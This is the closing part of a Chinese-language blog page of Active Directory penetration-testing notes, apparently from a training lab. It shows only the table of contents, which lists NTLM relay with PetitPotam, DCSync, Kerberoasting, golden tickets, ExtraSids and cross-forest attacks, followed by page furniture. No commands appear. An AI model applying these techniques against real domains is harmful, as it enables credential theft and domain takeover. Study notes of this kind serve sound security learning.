class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8-ntlmrelayx-py"><span class="toc-number">7.5.0.1.</span> <span class="toc-text">启动 ntlmrelayx.py</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C-PetitPotam-py"><span class="toc-number">7.5.0.2.</span> <span class="toc-text">运行 PetitPotam.py</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8D%95%E8%8E%B7%E7%94%A8%E4%BA%8E-DC01-%E7%9A%84-Base64-%E7%BC%96%E7%A0%81%E8%AF%81%E4%B9%A6"><span class="toc-number">7.5.0.3.</span> <span class="toc-text">捕获用于 DC01 的 Base64 编码证书</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-gettgtpkinit-py-%E8%AF%B7%E6%B1%82-TGT"><span class="toc-number">7.5.0.4.</span> <span class="toc-text">使用 gettgtpkinit.py 请求 TGT</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE-KRB5CCNAME-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">7.5.0.5.</span> <span class="toc-text">设置 KRB5CCNAME 环境变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8-TGT-%E8%BF%9B%E8%A1%8C-DCSync"><span class="toc-number">7.5.0.6.</span> <span class="toc-text">使用域控制器 TGT 进行 DCSync</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C-klist"><span class="toc-number">7.5.0.7.</span> <span class="toc-text">运行 klist</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A1%AE%E8%AE%A4%E5%AF%B9%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E7%9A%84%E7%AE%A1%E7%90%86%E5%91%98%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90"><span class="toc-number">7.5.0.8.</span> <span class="toc-text">确认对域控制器的管理员访问权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-getnthash-py-%E4%B8%BA%E8%87%AA%E5%B7%B1%E6%8F%90%E4%BA%A4-TGS-%E8%AF%B7%E6%B1%82"><span class="toc-number">7.5.0.9.</span> <span class="toc-text">使用 getnthash.py 为自己提交 TGS 请求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8-NTLM-%E5%93%88%E5%B8%8C%E8%BF%9B%E8%A1%8C-DCSync"><span class="toc-number">7.5.0.10.</span> <span class="toc-text">利用域控制器 NTLM 哈希进行 DCSync</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82-TGT-%E5%B9%B6%E4%BD%BF%E7%94%A8-DC01-%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E6%89%A7%E8%A1%8C-PTT"><span class="toc-number">7.5.0.11.</span> <span class="toc-text">请求 TGT 并使用 DC01$机器账户执行 PTT</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A1%AE%E8%AE%A4%E7%A5%A8%E6%8D%AE%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD"><span class="toc-number">7.5.0.12.</span> <span class="toc-text">确认票据在内存中</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Mimikatz-%E6%89%A7%E8%A1%8C-DCSync"><span class="toc-number">7.5.0.13.</span> <span class="toc-text">使用 Mimikatz 执行 DCSync</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%82%E9%A1%B9%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF"><span class="toc-number">7.6.</span> <span class="toc-text">杂项配置错误</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E5%8D%B0%E6%9C%BA%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.6.1.</span> <span class="toc-text">打印机漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE-MS-PRN-%E6%89%93%E5%8D%B0%E6%9C%BA%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.6.1.1.</span> <span class="toc-text">枚举 MS-PRN 打印机漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%97%85%E6%8E%A2-LDAP-%E5%87%AD%E6%8D%AE"><span class="toc-number">7.6.2.</span> <span class="toc-text">嗅探 LDAP 凭据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE-DNS-%E8%AE%B0%E5%BD%95"><span class="toc-number">7.6.3.</span> <span class="toc-text">枚举 DNS 记录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-adidnsdump"><span class="toc-number">7.6.3.1.</span> <span class="toc-text">使用 adidnsdump</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-r-%E9%80%89%E9%A1%B9%E8%A7%A3%E6%9E%90%E6%9C%AA%E7%9F%A5%E8%AE%B0%E5%BD%95"><span class="toc-number">7.6.3.2.</span> <span class="toc-text">使用 -r 选项解析未知记录</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF"><span class="toc-number">7.6.4.</span> <span class="toc-text">其他配置错误</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Get-DomainUser-%E5%9C%A8%E6%8F%8F%E8%BF%B0%E5%AD%97%E6%AE%B5%E4%B8%AD%E6%9F%A5%E6%89%BE%E5%AF%86%E7%A0%81"><span class="toc-number">7.6.4.1.</span> <span class="toc-text">使用 Get-DomainUser 在描述字段中查找密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Get-DomainUser-%E6%A3%80%E6%9F%A5-PASSWD-NOTREQD-%E8%AE%BE%E7%BD%AE"><span class="toc-number">7.6.4.2.</span> <span class="toc-text">使用 Get-DomainUser 检查 PASSWD_NOTREQD 设置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0%E4%B8%80%E4%B8%AA%E6%9C%89%E8%B6%A3%E7%9A%84%E8%84%9A%E6%9C%AC"><span class="toc-number">7.6.4.3.</span> <span class="toc-text">发现一个有趣的脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%A8%E8%84%9A%E6%9C%AC%E4%B8%AD%E6%9F%A5%E6%89%BE%E5%AF%86%E7%A0%81"><span class="toc-number">7.6.4.4.</span> <span class="toc-text">在脚本中查找密码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84%E7%AD%96%E7%95%A5%E9%A6%96%E9%80%89%E9%A1%B9-GPP-%E5%AF%86%E7%A0%81"><span class="toc-number">7.6.5.</span> <span class="toc-text">组策略首选项(GPP)密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-CrackMapExec-%E7%9A%84-gpp-autologin-%E6%A8%A1%E5%9D%97"><span class="toc-number">7.6.5.1.</span> <span class="toc-text">使用 CrackMapExec 的 gpp_autologin 模块</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ASREPRoasting"><span class="toc-number">7.6.6.</span> <span class="toc-text">ASREPRoasting</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Get-DomainUser-%E6%9E%9A%E4%B8%BE-DONT-REQ-PREAUTH-%E5%80%BC"><span class="toc-number">7.6.6.1.</span> <span class="toc-text">使用 Get-DomainUser 枚举 DONT_REQ_PREAUTH 值</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Rubeus-%E4%BB%A5%E6%AD%A3%E7%A1%AE%E6%A0%BC%E5%BC%8F%E6%A3%80%E7%B4%A2-AS-REP"><span class="toc-number">7.6.6.2.</span> <span class="toc-text">使用 Rubeus 以正确格式检索 AS-REP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Kerbrute-%E8%8E%B7%E5%8F%96-AS-REP"><span class="toc-number">7.6.6.3.</span> <span class="toc-text">使用 Kerbrute 获取 AS-REP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E9%9C%80%E9%A2%84%E8%AE%A4%E8%AF%81%E7%9A%84-Kerberoast-%E7%94%A8%E6%88%B7%E7%8B%A9%E7%8C%8E"><span class="toc-number">7.6.6.4.</span> <span class="toc-text">无需预认证的 Kerberoast 用户狩猎</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84%E7%AD%96%E7%95%A5%E5%AF%B9%E8%B1%A1%EF%BC%88GPO%EF%BC%89%E6%BB%A5%E7%94%A8"><span class="toc-number">7.6.7.</span> <span class="toc-text">组策略对象（GPO）滥用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-PowerView-%E6%9E%9A%E4%B8%BE-GPO-%E5%90%8D%E7%A7%B0"><span class="toc-number">7.6.7.1.</span> <span class="toc-text">使用 PowerView 枚举 GPO 名称</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%86%85%E7%BD%AE-Cmdlet-%E6%9E%9A%E4%B8%BE-GPO-%E5%90%8D%E7%A7%B0"><span class="toc-number">7.6.7.2.</span> <span class="toc-text">使用内置 Cmdlet 枚举 GPO 名称</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E5%9F%9F%E7%94%A8%E6%88%B7%E7%BB%84%E7%AD%96%E7%95%A5%E6%9D%83%E9%99%90"><span class="toc-number">7.6.7.3.</span> <span class="toc-text">枚举域用户组策略权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%86-GPO-GUID-%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%90%8D%E7%A7%B0"><span class="toc-number">7.6.7.4.</span> <span class="toc-text">将 GPO GUID 转换为名称</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8B%BF%E4%B8%8B%E4%B8%80%E4%B8%AA%E5%9F%9F%E5%90%8E%EF%BC%8C%E5%90%91%E7%9D%80%E5%85%B6%E4%BB%96%E5%9F%9F%E8%BF%9B%E6%94%BB"><span class="toc-number">8.</span> <span class="toc-text">拿下一个域后，向着其他域进攻</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E4%BF%A1%E4%BB%BB%E6%A6%82%E8%BF%B0"><span class="toc-number">8.1.</span> <span class="toc-text">域信任概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB"><span class="toc-number">8.2.</span> <span class="toc-text">枚举信任关系</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Get-ADTrust"><span class="toc-number">8.2.1.</span> <span class="toc-text">使用 Get-ADTrust</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Get-DomainTrust-%E6%A3%80%E6%9F%A5%E7%8E%B0%E6%9C%89%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB"><span class="toc-number">8.2.2.</span> <span class="toc-text">使用 Get-DomainTrust 检查现有信任关系</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Get-DomainTrustMapping"><span class="toc-number">8.2.3.</span> <span class="toc-text">使用 Get-DomainTrustMapping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Get-DomainUser-%E6%A3%80%E6%9F%A5%E5%AD%90%E5%9F%9F%E4%B8%AD%E7%9A%84%E7%94%A8%E6%88%B7"><span class="toc-number">8.2.4.</span> <span class="toc-text">使用 Get-DomainUser 检查子域中的用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-netdom-%E6%9F%A5%E8%AF%A2%E5%9F%9F%E4%BF%A1%E4%BB%BB"><span class="toc-number">8.2.5.</span> <span class="toc-text">使用 netdom 查询域信任</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-netdom-%E6%9F%A5%E8%AF%A2%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="toc-number">8.2.6.</span> <span class="toc-text">使用 netdom 查询域控制器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-netdom-%E6%9F%A5%E8%AF%A2%E5%B7%A5%E4%BD%9C%E7%AB%99%E5%92%8C%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">8.2.7.</span> <span class="toc-text">使用 netdom 查询工作站和服务器</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%9F%9F%E4%BF%A1%E4%BB%BB-%E5%AD%90%E5%9F%9F-%E7%88%B6%E5%9F%9F%E4%BF%A1%E4%BB%BB"><span class="toc-number">8.3.</span> <span class="toc-text">攻击域信任 - 子域 -&gt; 父域信任</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Mimikatz-%E8%8E%B7%E5%8F%96-KRBTGT-%E8%B4%A6%E6%88%B7%E7%9A%84-NT-%E5%93%88%E5%B8%8C"><span class="toc-number">8.3.1.</span> <span class="toc-text">使用 Mimikatz 获取 KRBTGT 账户的 NT 哈希</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Get-DomainSID"><span class="toc-number">8.3.2.</span> <span class="toc-text">使用 Get-DomainSID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Get-DomainGroup-%E8%8E%B7%E5%8F%96%E4%BC%81%E4%B8%9A%E7%AE%A1%E7%90%86%E5%91%98%E7%BB%84%E7%9A%84-SID"><span class="toc-number">8.3.3.</span> <span class="toc-text">使用 Get-DomainGroup 获取企业管理员组的 SID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Mimikatz-%E5%88%9B%E5%BB%BA%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">8.3.4.</span> <span class="toc-text">使用 Mimikatz 创建黄金票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-klist-%E7%A1%AE%E8%AE%A4%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84-Kerberos-%E7%A5%A8%E6%8D%AE"><span class="toc-number">8.3.5.</span> <span class="toc-text">使用 klist 确认内存中的 Kerberos 票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%97%E5%87%BA%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E7%9A%84%E6%95%B4%E4%B8%AA-C-%E7%9B%98"><span class="toc-number">8.3.6.</span> <span class="toc-text">列出域控制器的整个 C:盘</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ExtraSids-%E6%94%BB%E5%87%BB-Rubeus"><span class="toc-number">8.4.</span> <span class="toc-text">ExtraSids 攻击 - Rubeus</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-ls-%E7%A1%AE%E8%AE%A4%E6%97%A0%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%E5%90%8E%E5%86%8D%E8%BF%90%E8%A1%8C-Rubeus"><span class="toc-number">8.4.1.</span> <span class="toc-text">使用 ls 确认无访问权限后再运行 Rubeus</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Rubeus-%E5%88%9B%E5%BB%BA%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">8.4.2.</span> <span class="toc-text">使用 Rubeus 创建黄金票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-klist-%E7%A1%AE%E8%AE%A4%E7%A5%A8%E6%8D%AE%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD"><span class="toc-number">8.4.3.</span> <span class="toc-text">使用 klist 确认票据在内存中</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C-DCSync-%E6%94%BB%E5%87%BB"><span class="toc-number">8.4.4.</span> <span class="toc-text">执行 DCSync 攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E4%B8%8B%E5%9F%9F%E4%BF%A1%E4%BB%BB%E6%94%BB%E5%87%BB"><span class="toc-number">8.5.</span> <span class="toc-text">Linux下域信任攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-secretsdump-py-%E6%89%A7%E8%A1%8C-DCSync"><span class="toc-number">8.5.1.</span> <span class="toc-text">使用 secretsdump.py 执行 DCSync</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-lookupsid-py-%E8%BF%9B%E8%A1%8C-SID-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">8.5.2.</span> <span class="toc-text">使用 lookupsid.py 进行 SID 暴力破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E5%9F%9F%E5%AE%89%E5%85%A8%E6%A0%87%E8%AF%86%E7%AC%A6-Domain-SID"><span class="toc-number">8.5.3.</span> <span class="toc-text">查找域安全标识符 (Domain SID)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%AE%89%E5%85%A8%E6%A0%87%E8%AF%86%E7%AC%A6%EF%BC%88SID%EF%BC%89%E5%B9%B6%E9%99%84%E5%8A%A0%E5%88%B0%E4%BC%81%E4%B8%9A%E7%AE%A1%E7%90%86%E5%91%98-RID"><span class="toc-number">8.5.4.</span> <span class="toc-text">获取域安全标识符（SID）并附加到企业管理员 RID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-ticketer-py-%E6%9E%84%E5%BB%BA%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">8.5.5.</span> <span class="toc-text">使用 ticketer.py 构建黄金票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE-KRB5CCNAME-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-1"><span class="toc-number">8.5.6.</span> <span class="toc-text">设置 KRB5CCNAME 环境变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Impacket-%E7%9A%84-psexec-py-%E8%8E%B7%E5%8F%96-SYSTEM-shell"><span class="toc-number">8.5.7.</span> <span class="toc-text">使用 Impacket 的 psexec.py 获取 SYSTEM shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-raiseChild-py-%E6%89%A7%E8%A1%8C%E6%94%BB%E5%87%BB"><span class="toc-number">8.5.8.</span> <span class="toc-text">使用 raiseChild.py 执行攻击</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%89%93%E7%A0%B4%E7%95%8C%E9%99%90-%E8%B7%A8%E6%9E%97%E6%94%BB%E5%87%BB"><span class="toc-number">9.</span> <span class="toc-text">打破界限 - 跨林攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%A8%E6%9E%97-Kerberoasting"><span class="toc-number">9.1.</span> <span class="toc-text">跨林 Kerberoasting</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Get-DomainUser-%E6%9E%9A%E4%B8%BE%E5%85%B3%E8%81%94-SPN-%E7%9A%84%E8%B4%A6%E6%88%B7"><span class="toc-number">9.1.1.</span> <span class="toc-text">使用 Get-DomainUser 枚举关联 SPN 的账户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE-mssqlsvc-%E8%B4%A6%E6%88%B7"><span class="toc-number">9.1.2.</span> <span class="toc-text">枚举 mssqlsvc 账户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Rubeus-%E8%BF%9B%E8%A1%8C-Kerberoasting-%E6%94%BB%E5%87%BB%E5%B9%B6%E4%BD%BF%E7%94%A8-domain-%E6%A0%87%E5%BF%97"><span class="toc-number">9.1.3.</span> <span class="toc-text">使用 Rubeus 进行 Kerberoasting 攻击并使用 &#x2F;domain 标志</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E9%87%8D%E7%94%A8%E4%B8%8E%E7%BB%84%E6%9D%83%E9%99%90"><span class="toc-number">9.2.</span> <span class="toc-text">管理员密码重用与组权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Get-DomainForeignGroupMember"><span class="toc-number">9.2.1.</span> <span class="toc-text">使用 Get-DomainForeignGroupMember</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Enter-PSSession-%E8%AE%BF%E9%97%AE-DC03"><span class="toc-number">9.2.2.</span> <span class="toc-text">使用 Enter-PSSession 访问 DC03</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SID-%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E6%BB%A5%E7%94%A8-%E8%B7%A8%E6%9E%97"><span class="toc-number">9.3.</span> <span class="toc-text">SID 历史记录滥用 - 跨林</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%A8%E6%9E%97-Kerberoasting-Linux"><span class="toc-number">9.4.</span> <span class="toc-text">跨林 Kerberoasting(Linux)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-GetUserSPNs-py"><span class="toc-number">9.4.1.</span> <span class="toc-text">使用 GetUserSPNs.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-request-%E6%A0%87%E5%BF%97"><span class="toc-number">9.4.2.</span> <span class="toc-text">使用 -request 标志</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Bloodhound-python-%E8%BF%BD%E8%B8%AA%E5%A4%96%E9%83%A8%E7%BB%84%E6%88%90%E5%91%98%E8%BA%AB%E4%BB%BD"><span class="toc-number">9.5.</span> <span class="toc-text">使用 Bloodhound-python 追踪外部组成员身份</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%92%88%E5%AF%B9-INLANEFREIGHT-LOCAL-%E8%BF%90%E8%A1%8C-bloodhound-python"><span class="toc-number">9.5.1.</span> <span class="toc-text">针对 INLANEFREIGHT.LOCAL 运行 bloodhound-python</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E6%80%9D%E8%80%83"><span class="toc-number">10.</span> <span class="toc-text">总结思考</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://c2tsh4rk.github.io/2025/03/04/ADNotes/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://c2tsh4rk.github.io/2025/03/04/ADNotes/&text=AD Notes"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://c2tsh4rk.github.io/2025/03/04/ADNotes/&title=AD Notes"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://c2tsh4rk.github.io/2025/03/04/ADNotes/&is_video=false&description=AD Notes"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=AD Notes&body=Check out this article: http://c2tsh4rk.github.io/2025/03/04/ADNotes/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://c2tsh4rk.github.io/2025/03/04/ADNotes/&title=AD Notes"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://c2tsh4rk.github.io/2025/03/04/ADNotes/&title=AD Notes"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://c2tsh4rk.github.io/2025/03/04/ADNotes/&title=AD Notes"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://c2tsh4rk.github.io/2025/03/04/ADNotes/&title=AD Notes"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://c2tsh4rk.github.io/2025/03/04/ADNotes/&name=AD Notes&description=域渗透小思路以及笔记"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://c2tsh4rk.github.io/2025/03/04/ADNotes/&t=AD Notes"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2022-2025
    c2tsh4rk
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/c2tsh4rk">项目</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>


    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功！");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
